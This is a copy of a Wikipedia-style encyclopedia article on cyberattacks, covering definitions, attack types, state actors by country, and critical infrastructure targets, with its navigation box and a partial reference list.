Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
A cyberattack is any offensive maneuver that targets computer information systems, computer networks, infrastructures, or personal computer devices.[1] An attacker is a person or process that attempts to access data, functions, or other restricted areas of the system without authorization, potentially with malicious intent.[2] Depending on the context, cyberattacks can be part of cyber warfare or cyberterrorism. A cyberattack can be employed by sovereign states, individuals, groups, societies or organisations and it may originate from an anonymous source. A product that facilitates a cyberattack is sometimes called a cyber weapon. Cyber attacks have increased with an alarming rate for the last few years
A cyberattack may steal, alter, or destroy a specified target by hacking into a susceptible system.[3] Cyberattacks can range from installing spyware on a personal computer to attempting to destroy the infrastructure of entire nations. Legal experts are seeking to limit the use of the term to incidents causing physical damage, distinguishing it from the more routine data breaches and broader hacking activities.[4]
Cyberattacks have become increasingly sophisticated and dangerous.[5]
User behavior analytics and Security Information and Event Management (SIEM) can be used to help prevent these attacks.


Definitions[edit]
Since the late 1980s cyberattacks have evolved several times to use innovations in information technology as vectors for committing cybercrimes. In recent years, the scale and robustness of cyberattacks have increased rapidly, as observed by the World Economic Forum in its 2018 report: "Offensive cyber capabilities are developing more rapidly than our ability to deal with hostile incidents".[6]
In May 2000, the Internet Engineering Task Force defined attack in RFC 2828 as:[7]

an assault on system security that derives from an intelligent threat, i.e., an intelligent act that is a deliberate attempt (especially in the sense of a method or technique) to evade security services and violate the security policy of a system.
CNSS Instruction No. 4009 dated 26 April 2010 by Committee on National Security Systems of the United States of America[8]  defines an attack as:

Any kind of malicious activity that attempts to collect, disrupt, deny, degrade, or destroy information system resources or the information itself.
The increasing dependency of modern society on information and computer networks (both in private and public sectors, including the military)[9][10][11] has led to new terms like cyber attack and cyber warfare.
CNSS Instruction No. 4009[8] define a cyber attack as:

An attack, via cyberspace, targets an enterprise’s use of cyberspace for the purpose of disrupting, disabling, destroying, or maliciously controlling a computing environment/infrastructure; or destroying the integrity of the data or stealing controlled information.
As cars begin to adopt more technology, cyber attacks are becoming a security threat to automobiles.[12]

Prevalence[edit]
In the first six months of 2017, two billion data records were stolen or impacted by cyber attacks, and ransomware payments reached US$2 billion, double that in 2016.[13] In 2020, with the increase of remote work as an effect of the COVID-19 global pandemic, cybersecurity statistics reveal a huge increase in hacked and breached data.[14] The worldwide information security market is forecast to reach $170.4 billion in 2022.[15]

Cyber warfare and cyberterrorism[edit]
Main articles: Cyberwarfare and Cyberterrorism
Cyberwarfare utilizes techniques of defending and attacking information and computer networks that inhabit cyberspace, often through a prolonged cyber campaign or series of related campaigns. It denies an opponent's ability to do the same while employing technological instruments of war to attack an opponent's critical computer systems. Cyberterrorism, on the other hand, is "the use of computer network tools to shut down critical national infrastructures (such as energy, transportation, government operations) or to coerce or intimidate a government or civilian population".[16] That means the result of both cyberwarfare and cyberterrorism is the same, to damage critical infrastructures and computer systems linked together within the confines of cyberspace.
The financial crime expert Veit Buetterlin explained that organizations, including state actors, which cannot finance themselves through trade because of imposed sanctions, conduct cyber attacks on banks to generate funds.[17]

Factors[edit]
This section needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed. (July 2014) (Learn how and when to remove this template message)
Three factors contribute to why cyberattacks are launched against a state or an individual: the fear factor, the spectacularity factor, and the vulnerability factor.

Spectacularity factor[edit]
The spectacularity factor is a measure of the actual damage achieved by an attack, meaning that the attack creates direct losses (usual loss of availability or loss of income) and garners negative publicity. On 8 February 2000, a Denial of Service attack severely reduced traffic to many major sites, including Amazon, Buy.com, CNN, and eBay (the attack continued to affect still other sites the next day).[18] Amazon reportedly estimated the loss of business at $600,000.[18]

Vulnerability factor[edit]
The vulnerability factor exploits how vulnerable an organization or government establishment is to cyberattacks. Organizations without maintenance systems might be running on old servers which are more vulnerable than updated systems. An organization can be vulnerable to a denial of service attack and a government establishment can be defaced on a web page. A computer network attack disrupts the integrity or authenticity of data, usually through malicious code that alters program logic that controls data, leading to errors in the output.[19]

Professional hackers to cyberterrorists[edit]
This section possibly contains original research. Please improve it by verifying the claims made and adding inline citations. Statements consisting only of original research should be removed. (March 2015) (Learn how and when to remove this template message)
Professional hackers, either working on their own or employed by government agencies or the military, can find computer systems with vulnerabilities lacking the appropriate security software. Once those vulnerabilities are found, they can infect systems with malicious code and then remotely control the system or computer by sending commands to view content or to disrupt other computers. There needs to be a pre-existing system flaw within the computer such as no antivirus protection or faulty system configuration for the viral code to work.
Many professional hackers will promote themselves to cyber terrorists, for financial gain or other reasons.[20] This means a new set of rules govern their actions. Cyberterrorists have premeditated plans and their attacks are not born of rage.[21] They need to develop their plans step-by-step and acquire the appropriate software to carry out an attack. They usually have political agendas, targeting political structures. Cyberterrorists are hackers with a political motivation, their attacks can impact political structure through this corruption and destruction.[21]  They also target civilians, civilian interests, and civilian installations. As previously stated, cyberterrorists attack persons or property and cause enough harm to generate fear.

Types of attack[edit]
An attack can be active or passive.[7]

An "active attack" attempts to alter system resources or affect their operation.
A "passive attack" attempts to learn or make use of information from the system but does not affect system resources (e.g., wiretapping).
An attack can be perpetrated by an insider or from outside the organization;[7]

An "inside attack" is an attack initiated by an entity inside the security perimeter (an "insider"), i.e., an entity that is authorized to access system resources but uses them in a way not approved by those who granted the authorization.
An "outside attack" is initiated from outside the perimeter, by an unauthorized or illegitimate user of the system (an "outsider"). In the Internet, potential outside attackers range from amateur pranksters to organized criminals, international terrorists, and hostile governments.[7]

A resource (both physical or logical), called an asset, can have one or more vulnerabilities that can be exploited by a threat agent in a threat action. As a result, the confidentiality, integrity or availability of resources may be compromised. Potentially, the damage may extend to resources in addition to the one initially identified as vulnerable, including further resources of the organization, and the resources of other involved parties (customers, suppliers).
The so-called CIA triad is the basis of information security.
The attack can be active when it attempts to alter system resources or affect their operation: so it compromises integrity or availability. A "passive attack" attempts to learn or make use of information from the system but does not affect system resources: so it compromises confidentiality.
A threat is a potential for violation of security, which exists when there is a circumstance, capability, action or event that could breach security and cause harm. That is, a threat is a possible danger that might exploit a vulnerability. A threat can be either "intentional" (i.e., intelligent; e.g., an individual cracker or a criminal organization) or "accidental" (e.g., the possibility of a computer malfunctioning, or the possibility of an "act of God" such as an earthquake, a fire, or a tornado).[7]
A set of policies concerned with information security management, the information security management systems (ISMS), has been developed to manage, according to risk management principles, the countermeasures in order to accomplish to a security strategy set up following rules and regulations applicable in a country.[22]
An attack should lead to a security incident i.e. a security event that involves a security violation. In other words, a security-relevant system event in which the system's security policy is disobeyed or otherwise breached.
The overall picture represents the risk factors of the risk scenario.[23]
An organization should take steps to detect, classify and manage security incidents. The first logical step is to set up an incident response plan and eventually a computer emergency response team.
In order to detect attacks, a number of countermeasures can be set up at organizational, procedural, and technical levels. Computer emergency response team, information technology security audit and intrusion detection system are examples of these.[24]
An attack usually is perpetrated by someone with bad intentions: black hatted attacks falls in this category, while other perform penetration testing on an organization information system to find out if all foreseen controls are in place.
The attacks can be classified according to their origin: i.e. if it is conducted using one or more computers: in the last case is called a distributed attack. Botnets are used to conduct distributed attacks.
Other classifications are according to the procedures used or the type of vulnerabilities exploited: attacks can be concentrated on network mechanisms or host features.
Some attacks are physical: i.e. theft or damage of computers and other equipment. Others are attempts to force changes in the logic used by computers or network protocols in order to achieve unforeseen (by the original designer) result but useful for the attacker. Software used to for logical attacks on computers is called malware.
The following is a partial short list of attacks:

Passive
Computer and network surveillance
Network
Wiretapping
Fiber tapping
Port scan
Idle scan
Host
Keystroke logging
Data scraping
Backdoor
Active
Denial-of-service attack
DDos or Distributed Denial of service attack is an attempt made by the hacker to block access to a server or a website that is connected to the Internet. This is achieved using multiple computerized systems, which overloads the target system with requests, making it incapable of responding to any query.[25]
Spoofing
Mixed threat attack
Network
Man-in-the-middle
Man-in-the-browser
ARP poisoning
Ping flood
Ping of death
Smurf attack
Host
Buffer overflow
Heap overflow
Stack overflow
Format string attack
By modality
Supply chain attack
Social engineering
Exploit
 Intrusion kill chain for information security[26]
In detail, there are a number of techniques to utilize in cyberattacks and a variety of ways to administer them to individuals or establishments on a broader scale. Attacks are broken down into two categories: syntactic attacks and semantic attacks. Syntactic attacks are straightforward; it is considered malicious software which includes viruses, worms, and Trojan horses.

Syntactic attacks[edit]
Viruses[edit]
Main article: Computer virus
A virus is a self-replicating program that can attach itself to another program or file in order to reproduce. The virus can hide in unlikely locations in the memory of a computer system and attach itself to whatever file it sees fit to execute its code. It can also change its digital footprint each time it replicates making it harder to track down in the computer.

Worms[edit]
Main article: Computer worm
A worm does not need another file or program to copy itself; it is a self-sustaining running program. Worms replicate over a network using protocols. The latest incarnation of worms make use of known vulnerabilities in systems to penetrate, execute their code, and replicate to other systems such as the Code Red II worm that infected more than 259 000 systems in less than 14 hours.[27] On a much larger scale, worms can be designed for industrial espionage to monitor and collect server and traffic activities then transmit it back to its creator.

Trojan horses[edit]
Main article: Trojan horse (computing)
A Trojan horse is designed to perform legitimate tasks but it also performs unknown and unwanted activity. It can be the basis of many viruses and worms installing onto the computer as keyboard loggers and backdoor software. In a commercial sense, Trojans can be imbedded in trial versions of software and can gather additional intelligence about the target without the person even knowing it happening. All three of these are likely to attack an individual and establishment through emails, web browsers, chat clients, remote software, and updates.

Semantic attacks[edit]
Semantic attack is the modification and dissemination of correct and incorrect information. Information modified could have been done without the use of computers even though new opportunities can be found by using them. To set someone in the wrong direction or to cover your tracks, the dissemination of incorrect information can be utilized.

Cyberattacks by and against countries[edit]
Within cyberwarfare, the individual must recognize the state actors involved in committing these cyberattacks against one another. The two predominant players that will be discussed is the age-old comparison of East versus West, China's cyber capabilities compared to United States' capabilities. There are many other state and non-state actors involved in cyberwarfare, such as Russia, Iran, Iraq, and Al Qaeda; since China and the U.S. are leading the foreground in cyberwarfare capabilities, they will be the only two states actors discussed.
But in Q2 2013, Akamai Technologies reported that Indonesia toppled China with a portion 38 percent of cyber attacks, a high increase from the 21 percent portion in the previous quarter. China set 33 percent and the US set at 6.9 percent. 79 percent of attacks came from the Asia Pacific region. Indonesia dominated the attacking to ports 80 and 443 by about 90 percent.[28]

Azerbaijan[edit]
Hackers from Azerbaijan and Armenia have actively participated in cyberwarfare as part of the Nagorno-Karabakh conflicyber warfare over the disputed region of Nagorno-Karabakh, with Azerbaijani hackers targeting Armenian websites and posting Ilham Aliyev's statements.[29][30]

Canada[edit]
"Chinese state-sponsored actor" attacked a research facility in Canada in 2011. Unknown hackers attacked Canada's foreign ministry in 2022.[31]

China[edit]
Main article: Chinese cyberwarfare
This section, except for one footnote, needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Cyberattack" – news · newspapers · books · scholar · JSTOR (July 2013) (Learn how and when to remove this template message)
China's People's Liberation Army (PLA) has developed a strategy called "Integrated Network Electronic Warfare" which guides computer network operations and cyberwarfare tools. This strategy helps link together network warfare tools and electronic warfare weapons against an opponent's information systems during the conflict. They believe the fundamentals for achieving success is about seizing control of an opponent's information flow and establishing information dominance.[32] The Science of Military and The Science of Campaigns both identify enemy logistics systems networks as the highest priority for cyberattacks and states that cyberwarfare must mark the start of a campaign, used properly, can enable overall operational success.[32] Focusing on attacking the opponent's infrastructure to disrupt transmissions and processes of information that dictate decision-making operations, the PLA would secure cyber dominance over their adversary. The predominant techniques that would be utilized during a conflict to gain the upper hand are as follows, the PLA would strike with electronic jammers, electronic deception, and suppression techniques to interrupt the transfer processes of information. They would launch virus attacks or hacking techniques to sabotage information processes, all in the hopes of destroying enemy information platforms and facilities. The PLA's Science of Campaigns noted that one role for cyberwarfare is to create windows of opportunity for other forces to operate without detection or with a lowered risk of counterattack by exploiting the enemy's periods of "blindness", "deafness" or "paralysis" created by cyberattacks.[32] That is one of the main focal points of cyberwarfare, to be able to weaken your enemy to the full extent possible so that your physical offensive will have a higher percentage of success.
The PLA conducts regular training exercises in a variety of environments emphasizing the use of cyberwarfare tactics and techniques in countering such tactics if it is employed against them.  Faculty research has been focusing on designs for rootkit usage and detection for their Kylin Operating System which helps to further train these individuals' cyberwarfare techniques. China perceives cyber warfare as a deterrent to nuclear weapons, possessing the ability for greater precision, leaving fewer casualties, and allowing for long-ranged attacks.
On March 2, 2021, Microsoft released an emergency security update to patch four security vulnerabilities that had been used by Hafnium, a Chinese nation-state-sponsored hacking group that had compromised at least 30,000 public and private Microsoft exchange servers.[33]

Estonia[edit]
Main article: 2007 cyberattacks on Estonia
The 2007 cyberattacks on Estonia were a series of cyberattacks that began on 27 April 2007 and targeted websites of Estonian organizations, including Estonian parliament, banks, ministries, newspapers, and broadcasters, amid the country's disagreement with Russia about the relocation of the Bronze Soldier of Tallinn, an elaborate Soviet-era grave marker, as well as war graves in Tallinn.[34][35] The attacks triggered a number of military organizations around the world to reconsider the importance of network security to modern military doctrine. The direct result of the cyberattacks was the creation of the NATO Cooperative Cyber Defence Centre of Excellence in Tallinn.

Ethiopia[edit]
In an extension of a bilateral dispute between Ethiopia and Egypt over the Grand Ethiopian Renaissance Dam, Ethiopian government websites have been hacked by the Egypt-based hackers in June 2020.[36]

India and Pakistan[edit]
Main article: India–Pakistan relations
There were two such instances between India and Pakistan that involved cyberspace conflicts, started in 1990s. Earlier cyber attacks came to known as early as in 1999.[21] Since then, India and Pakistan were engaged in a long-term dispute over Kashmir which moved into cyberspace. Historical accounts indicated that each country's hackers have been repeatedly involved in attacking each other's computing database system. The number of attacks has grown yearly: 45 in 1999, 133 in 2000, 275 by the end of August 2001.[21] In 2010, Indian hackers laid a cyber attack at least 36 government database websites going by the name "Indian Cyber Army".[37] In 2013, Indian hackers hacked the official website of Election Commission of Pakistan in an attempt to retrieve sensitive database information.[38] In retaliation, Pakistani hackers, calling themselves "True Cyber Army" hacked and defaced ~1,059 websites of Indian election bodies.[38]
In 2013, India's Ministry of Electronics and Information Technology (MeitY) which was then known as Department of Electronics and Information Technology (DeitY), unveiled a cybersecurity policy framework called National Cyber Security Policy 2013 which officially came into effect on July 1, 2013.[39]
According to the media, Pakistan's has been working on effective cyber security system, in a program called the "Cyber Secure Pakistan" (CSP).[40]  The program was launched in April 2013 by Pakistan Information Security Association and the program has expanded to country's universities.
In 2020, according to the Media reports, Pakistan Army confirms the series of Cyber Attacks that has been identified on Pakistani Government and private websites by the Indian Intelligence. ISPR also advised the government and private institutions to enhance cyber security measures.[41]

Iran[edit]
On 8 February 2020, the telecommunication network of Iran witnessed extensive disruptions at 11:44 a.m. local time, which lasted for about an hour. The Ministry of Information and Communications Technology of Iran confirmed it as a Distributed Denial of Service (DDoS) attack. The Iranian authorities activated the "Digital Fortress" cyber-defense mechanism to repel. Also known as DZHAFA, it led to a drop of 75 percent in the national internet connectivity.[42]
On the noon of 26 October 2021, A cyberattack caused all 4,300 fuel stations in Iran to disrupt and disable government-issued cards for buying subsidized fuel. This cyberattack also caused digital billboards to display messages against the Iranian government.[43][44]

Ireland[edit]
Main article: Health Service Executive ransomware attack
On 14 May 2021, the Health Service Executive (HSE) of Ireland suffered a major ransomware cyberattack which caused all of its IT systems nationwide to be shut down.[45][46][47][48]
It was the most significant cybercrime attack on an Irish state agency and the largest known attack against a health service computer system.[49][50] The group responsible was identified as a criminal gang known as Wizard Spider, believed to be operating from Russia.[51][52][53] The same group is believed to have attacked Ireland's Department of Health with a similar cyberattack.

Israel[edit]
In April 2020, there were attempts to hack into Israel's water infrastructure of the Sharon central region by Iran, which was thwarted by Israeli cyber defenses. The cyberattack intended to introduce dangerous levels of chlorine into the Israeli water supply.[54]

North Korea[edit]
Further information: Sony Pictures hack
Norway[edit]
In August 2020 the Norwegian parliament Stortinget suffered a cyberattack on the email system belonging to several officials. In December 2020, the Norwegian Police Security Service said the likely perpetrators were the Russian cyber espionage group Fancy Bear.[55]

Russia[edit]
During the 2018 FIFA World Cup, Russia countered and stopped around 25 million cyber-attacks on IT Infrastructure.[56][57]
In June 2019, Russia has conceded that it is "possible" its electrical grid is under cyberattack by the United States.[58] The New York Times reported that American hackers from the United States Cyber Command planted malware potentially capable of disrupting the Russian electrical grid.[59]
On 19 October 2020, the US justice department charged six Russian military officers of a worldwide hacking campaign, which attacked targets like French election, the 2018 Winter Olympic Games opening ceremony, US businesses and Ukraine's electricity grid. The campaign was believed to have cost billions of dollars for the mass disruption it caused.[60]

Ukraine[edit]
Main article: 2017 cyberattacks on Ukraine
A series of powerful cyberattacks began 27 June, 2017, that swamped websites of Ukrainian organizations, including banks, ministries, newspapers and electricity firms. In January 2022, Microsoft disclosed activity of a ransomware and DoS attack on various government agencies and organizations.[61][62]

United Arab Emirates[edit]
In 2019, Reuters reported that United Arab Emirates launched a series of cyberattacks on its political opponents, journalists, and human rights activists under Project Raven, on an espionage platform namely Karma. The team included ex-US intelligence agents. Project Raven commenced in 2009 and was planned to be continued for the coming ten years.
United Arab Emirates, used and asked for help from couple of countries providing their best calibres to overcome this crisis, and to confine the damage and consequences upon Project Raven, and indeed big names did participate to help like the American master, Graham Dexter, and the Egyptian phenomenal name in cybersecurity, Elhamy Elsebaey.[63]

United States[edit]
This section's tone or style may not reflect the encyclopedic tone used on Wikipedia. See Wikipedia's guide to writing better articles for suggestions. (August 2019) (Learn how and when to remove this template message)
See also: Office of Personnel Management data breach and Vault 7
In the west, the United States provides a different "tone of voice" when cyberwarfare is on the tip of everyone's tongue. The United States provides security plans strictly in the response to cyberwarfare, basically going on the defensive when they are being attacked by devious cyber methods. In the U.S., the responsibility of cybersecurity is divided between the Department of Homeland Security, the Federal Bureau of Investigation, and the Department of Defense. In recent years, a new department was created to specifically tend to cyber threats, this department is known as Cyber Command. Cyber Command is a military subcommand under US Strategic Command and is responsible for dealing with threats to the military cyber infrastructure. Cyber Command's service elements include Army Forces Cyber Command, the Twenty-Fourth Air Force, Fleet Cyber Command and Marine Forces Cyber Command.[64] It ensures that the President can navigate and control information systems and that he also has military options available when defense of the nation needs to be enacted in cyberspace. Individuals at Cyber Command must pay attention to state and non-state actors who are developing cyberwarfare capabilities in conducting cyber espionage and other cyberattacks against the nation and its allies. Cyber Command seeks to be a deterrence factor to dissuade potential adversaries from attacking the U.S., while being a multi-faceted department in conducting cyber operations of its own.
Three prominent events took place which may have been catalysts in the creation of the idea of Cyber Command. There was a failure of critical infrastructure reported by the CIA where malicious activities against information technology systems disrupted electrical power capabilities overseas. This resulted in multi-city power outages across multiple regions. The second event was the exploitation of global financial services. In November 2008, an international bank had a compromised payment processor that allowed fraudulent transactions to be made at more than 130 automated teller machines in 49 cities within a 30-minute period.[65] The last event was the systemic loss of U.S. economic value when an industry in 2008 estimated $1 trillion in losses of intellectual property to data theft. Even though all these events were internal catastrophes, they were very real in nature, meaning nothing can stop state or non-state actors to do the same thing on an even grander scale. Other initiatives like the Cyber Training Advisory Council were created to improve the quality, efficiency, and sufficiency of training for computer network defense, attack, and exploitation of enemy cyber operations.
On both ends of the spectrum, East and West nations show a "sword and shield" contrast in ideals. The Chinese have a more offensive minded idea for cyberwarfare, trying to get the pre-emptive strike in the early stages of conflict to gain the upper-hand. In the U.S. there are more reactionary measures being taken at creating systems with impenetrable barriers to protect the nation and its civilians from cyberattacks.
According to Homeland Preparedness News, many mid-sized U.S. companies have a difficult time defending their systems against cyber-attacks. Around 80 percent of assets vulnerable to a cyber-attack are owned by private companies and organizations. Former New York State Deputy Secretary for Public Safety Michael Balboni said that private entities "do not have the type of capability, bandwidth, interest or experience to develop a proactive cyber analysis."[66]
In response to cyberattacks on 1 April 2015, President Obama issued an Executive Order establishing the first-ever economic sanctions. The Executive Order will impact individuals and entities ("designees") responsible for cyber-attacks that threaten the national security, foreign policy, economic health, or financial stability of the US. Specifically, the Executive Order authorizes the Treasury Department to freeze designees' assets.[67]
According to Ted Koppel's book, in 2008, the United States in collaboration with Israel, ran a cyber-attack on Iran's nuclear program, becoming "the first to use a digital weapon as an instrument of policy".[68]

Consequence of a potential attack[edit]
Consequences can include a multitude of direct and indirect effects. In September 2020, media reported of what may be the first publicly confirmed case of a civilian fatality as a nearly direct consequence of a cyberattack, after ransomware disrupted a hospital in Germany.[69]
A whole industry is working to minimize the likelihood and the consequences of a cyberattack.
For a partial list see: Computer security software companies.
Activities, often offered as products and services, may be aimed at:

Studying all possible attacks category
Publishing books and articles about the subject
Discovering vulnerabilities
Evaluating the risks
Fixing vulnerabilities
Inventing, designing and deploying countermeasures
Setting up a contingency plan in order to be ready to respond
Many organizations are trying to classify vulnerability and their consequences. The most popular vulnerability database is the Common Vulnerabilities and Exposures.
Computer emergency response teams are set up by governments and large organizations to handle computer security incidents.

Infrastructures as targets[edit]
Once a cyberattack has been initiated, there are certain targets that need to be attacked to cripple the opponent. Certain infrastructures as targets have been highlighted as critical infrastructures in times of conflict that can severely cripple a nation. Control systems, energy resources, finance, telecommunications, transportation, and water facilities are seen as critical infrastructure targets during conflict. A new report on the industrial cybersecurity problems, produced by the British Columbia Institute of Technology, and the PA Consulting Group, using data from as far back as 1981, reportedly has found a 10-fold increase in the number of successful cyberattacks on infrastructure Supervisory Control and Data Acquisition (SCADA) systems since 2000.[19] Cyberattacks that have an adverse physical effect are known as cyber-physical attacks.[70]

Control systems[edit]
Control systems are responsible for activating and monitoring industrial or mechanical controls. Many devices are integrated with computer platforms to control valves and gates to certain physical infrastructures. Control systems are usually designed as remote telemetry devices that link to other physical devices through internet access or modems. Little security can be offered when dealing with these devices, enabling many hackers or cyberterrorists to seek out systematic vulnerabilities. Paul Blomgren, manager of sales engineering at cybersecurity firm explained how his people drove to a remote substation, saw a wireless network antenna and immediately plugged in their wireless LAN cards. They took out their laptops and connected to the system because it wasn't using passwords. "Within 10 minutes, they had mapped every piece of equipment in the facility," Blomgren said. "Within 15 minutes, they mapped every piece of equipment in the operational control network. Within 20 minutes, they were talking to the business network and had pulled off several business reports. They never even left the vehicle."[71]

Energy[edit]
Energy is seen as the second infrastructure that could be attacked. It is broken down into two categories, electricity and natural gas. Electricity also known as electric grids power cities, regions, and households; it powers machines and other mechanisms used in day-to-day life. Using US as an example, in a conflict cyberterrorists can access data through the Daily Report of System Status that shows power flows throughout the system and can pinpoint the busiest sections of the grid. By shutting those grids down, they can cause mass hysteria, backlog, and confusion; also being able to locate critical areas of operation to further attacks in a more direct method. Cyberterrorists can access instructions on how to connect to the Bonneville Power Administration which helps direct them on how to not fault the system in the process. This is a major advantage that can be utilized when cyberattacks are being made because foreign attackers with no prior knowledge of the system can attack with the highest accuracy without drawbacks. Cyberattacks on natural gas installations go much the same way as it would with attacks on electrical grids. Cyberterrorists can shutdown these installations stopping the flow or they can even reroute gas flows to another section that can be occupied by one of their allies. There was a case in Russia with a gas supplier known as Gazprom, they lost control of their central switchboard which routes gas flow, after an inside operator and Trojan horse program bypassed security.[71]
The 2021 Colonial Pipeline cyberattack caused a sudden shutdown of the pipeline that carried 45% of the gasoline, diesel, and jet fuel consumed on the East Coast of the United States.

Finance[edit]
Financial infrastructures could be hit hard by cyberattacks as the financial system is linked by computer systems.[3] Money is constantly being exchanged in these institutions and if cyberterrorists were to attack and if transactions were rerouted and large amounts of money stolen, financial industries would collapse and civilians would be without jobs and security. Operations would stall from region to region causing nationwide economic degradation. In the U.S. alone, the average daily volume of transactions hit $3 trillion and 99% of it is non-cash flow.[71] To be able to disrupt that amount of money for one day or for a period of days can cause lasting damage making investors pull out of funding and erode public confidence.
A cyberattack on a financial institution or transactions may be referred to as a cyberheist. These attacks may start with phishing that targets employees, using social engineering to coax information from them. They may allow attackers to hack into the network and put keyloggers on the accounting systems. In time, the cybercriminals are able to obtain password and keys information. An organization's bank accounts can then be accessed via the information they have stolen using the keyloggers.[72] In May 2013, a gang carried out a US$40 million cyberheist from the Bank of Muscat.[73]

Telecommunications[edit]
Cyberattacking telecommunication infrastructures have straightforward results. Telecommunication integration is becoming common practice, systems such as voice and IP networks are merging. Everything is being run through the internet because the speeds and storage capabilities are endless. Denial-of-service attacks can be administered as previously mentioned, but more complex attacks can be made on BGP routing protocols or DNS infrastructures. It is less likely that an attack would target or compromise the traditional telephony network of SS7 switches, or an attempted attack on physical devices such as microwave stations or satellite facilities. The ability would still be there to shut down those physical facilities to disrupt telephony networks. The whole idea on these cyberattacks is to cut people off from one another, to disrupt communication, and by doing so, to impede critical information being sent and received. In cyberwarfare, this is a critical way of gaining the upper hand in a conflict. By controlling the flow of information and communication, a nation can plan more accurate strikes and enact better counter-attack measures on their enemies.

Transportation[edit]
Transportation infrastructure mirrors telecommunication facilities: by impeding transportation for individuals in a city or region, the economy will slightly degrade over time. Successful cyberattacks can impact scheduling and accessibility, creating a disruption in the economic chain. Carrying methods will be impacted, making it hard for cargo to be sent from one place to another. In January 2003 during the "slammer" virus, Continental Airlines was forced to shut down flights due to computer problems.[71] Cyberterrorists can target railroads by disrupting switches, target flight software to impede airplanes, and target road usage to impede more conventional transportation methods. In May 2015, a man, Chris Roberts, who was a cyberconsultant, revealed to the FBI that he had repeatedly, from 2011 to 2014, managed to hack into Boeing and Airbus flights' controls via the onboard entertainment system, allegedly, and had at least once ordered a flight to climb. The FBI, after detaining him in April 2015 in Syracuse, had interviewed him about the allegations.[74]

Water[edit]
Water as an infrastructure could be one of the most critical infrastructures to be attacked. It is seen as one of the greatest security hazards among all of the computer-controlled systems. There is the potential to have massive amounts of water unleashed into an area which could be unprotected causing loss of life and property damage. It is not even water supplies that could be attacked; sewer systems can be compromised too. There was no calculation given to the cost of damages, but the estimated cost to replace critical water systems could be in the hundreds of billions of dollars.[71] Most of these water infrastructures are well developed making it hard for cyberattacks to cause any significant damage, at most, equipment failure can occur causing power outlets to be disrupted for a short time.

Hospitals[edit]
Hospital as an infrastructure is one of the major assets to have been impacted by cyberattacks. These attacks could "directly lead to deaths." The cyberattacks are designed to deny hospital workers access to critical care systems. Recently, there has been a major increase of cyberattacks against hospitals amid the COVID-19 pandemic. Hackers lock up a network and demand ransom to return access to these systems. The ICRC and other human rights group have urged law enforcement to take “immediate and decisive action” to punish such cyberattackers.[75]

See also[edit]

Asset (computing)
Common Vulnerabilities and Exposures
Computer emergency response team
Computer insecurity
Computer security
Contingency plan
Countermeasure (computer)
Exploit (computer security)
Factor Analysis of Information Risk
Hacking: The Art of Exploitation Second Edition
Internet Engineering Task Force
Information technology security audit
Information Security
Intrusion detection system
IT risk
List of cyber warfare forces
Metasploit
Month of Bugs
National Information Assurance Glossary
Network lateral movement
Penetration test
Risk factor
Security control
Security service (telecommunication)
Threat
Vulnerability
Vulnerability management
Web application attack and audit framework (w3af)
List of cyberattacks
Access control
Security controls
Security management

References[edit]


^ "Cyber Attack - Glossary". csrc.nist.gov. Retrieved 5 September 2021.

^ "ISTQB Standard glossary of terms used in Software Testing". Archived from the original on 5 November 2018. Retrieved 8 March 2019.

^ a b Lin, Tom C. W. (14 April 2016). "Financial Weapons of War". ssrn.com.

^ Satter, Raphael (28 March 2017). "What makes a cyberattack? Experts lobby to restrict the term". Retrieved 7 July 2017.

^ S. Karnouskos: Stuxnet Worm Impact on Industrial Cyber-Physical System Security. In:37th Annual Conference of the IEEE Industrial Electronics Society (IECON 2011), Melbourne, Australia, 7-10 Nov 2011. Retrieved 20 April 2014.

^ "The Global Risks Report 2018 13th Edition" (PDF). World Economic Forum. World Economic Forum. 2018. Archived from the original (PDF) on 19 June 2018. Alt URL)

^ a b c d e Internet Security Glossary. doi:10.17487/RFC2828. RFC 2828.

^ a b CNSS Instruction No. 4009 dated 26 April 2010

^ Cortada, James W. (4 December 2003). The Digital Hand: How Computers Changed the Work of American Manufacturing, Transportation, and Retail Industries. USA: Oxford University Press. p. 512. ISBN 978-0-19-516588-3.

^ Cortada, James W. (3 November 2005). The Digital Hand: Volume II: How Computers Changed the Work of American Financial, Telecommunications, Media, and Entertainment Industries. USA: Oxford University Press. ISBN 978-0-19-516587-6.

^ Cortada, James W. (6 November 2007). The Digital Hand, Vol 3: How Computers Changed the Work of American Public Sector Industries. USA: Oxford University Press. p. 496. ISBN 978-0-19-516586-9.

^ "Sectigo Releases Embedded Firewall to Protect Automotive Systems". www.embedded-computing.com. Retrieved 9 January 2020.

^ Fosco, Molly (30 October 2018). "Will Artificial Intelligence Save Us From the Next Cyberattack?". Fast Forward. OZY. Retrieved 30 October 2018.

^ Sobers, Rob (16 March 2021). "134 Cybersecurity Statistics and Trends for 2021 | Varonis". Inside Out Security. Retrieved 27 February 2021.

^ "Forecast Analysis: Information Security, Worldwide, 2Q18 Update". Gartner. Retrieved 27 February 2022.

^ Lewis, James. United States. Center for Strategic and International Studies. Assessing the Risks of Cyber Terrorism, Cyber War and Other Cyber Threats. Washington, D.C.:, 2002. Web.

^ Wise, Hannah. "Fighting the war against terrorist financing". Archived from the original on 14 January 2020. Retrieved 20 December 2020.

^ a b "Distributed Denial-Of-Service". www.garykessler.net.

^ a b Linden, Edward. Focus on Terrorism. New York: Nova Science Publishers, Inc., 2007. Web.

^ Conway, Maura. "Cyberterrorism: Academic Perspectives". 3rd European Conference on Information Warfare and Security: 41–50.

